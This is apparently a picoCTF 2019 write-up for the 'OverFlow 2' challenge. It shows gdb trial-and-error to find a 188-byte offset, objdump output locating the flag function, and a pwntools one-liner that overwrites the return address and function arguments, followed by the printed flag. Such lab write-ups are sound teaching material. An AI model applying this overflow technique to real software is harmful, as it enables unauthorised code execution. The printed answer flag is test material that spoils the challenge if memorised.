# OverFlow 2
#### Now try overwriting arguments. Can you get the flag from this [program](https://2019shell1.picoctf.com/static/f6a5f545b2412a67527aa6e8319898e0/vuln)? You can find it in /problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e on the shell server. [Source](https://2019shell1.picoctf.com/static/f6a5f545b2412a67527aa6e8319898e0/vuln.c).

We can solve this problem in almost the same way we solved overflow 1. First we have to find where the return address is overflowed. We
can do this with gdb and some trial and error.

```
Starting program: /problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e/vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCDEFGHIJKL
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCDEFGHIJKL

Program received signal SIGSEGV, Segmentation fault.
0x08004c4b in ?? ()
```

We find out that after 188 bytes the return address changes. Next we have to find out the address of the flag function. We can do this with
gdb or with objdump.

```
Supermac30@pico-2019-shell1:/problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e$ objdump -D vuln | grep flag
080485e6 <flag>:
 8048618:       75 1c                   jne    8048636 <flag+0x50>
 8048651:       75 1a                   jne    804866d <flag+0x87>
 804865a:       75 14                   jne    8048670 <flag+0x8a>
 804866b:       eb 04                   jmp    8048671 <flag+0x8b>
 804866e:       eb 01                   jmp    8048671 <flag+0x8b>
 ```
 
 Then we use inline python and the pwn library to change the address. We still have to change the arguements. All arguements for a function
 can be found 4 bytes after the beginning. To change the arguements to 0xdeadbeef and 0xc0ded00d we can insert them 4 'A's after the 
 address of the function.
 
 ```
Supermac30@pico-2019-shell1:/problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e$ python -c 'from pwn import *; print "A"*188 + p32(0x080485e6) + "AAAA" + p32(0xdeadbeef) + p32(0xc0ded00d)' | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn55897b905}Segmentation fault (core dumped)
```

Flag: picoCTF{arg5_and_r3turn55897b905}
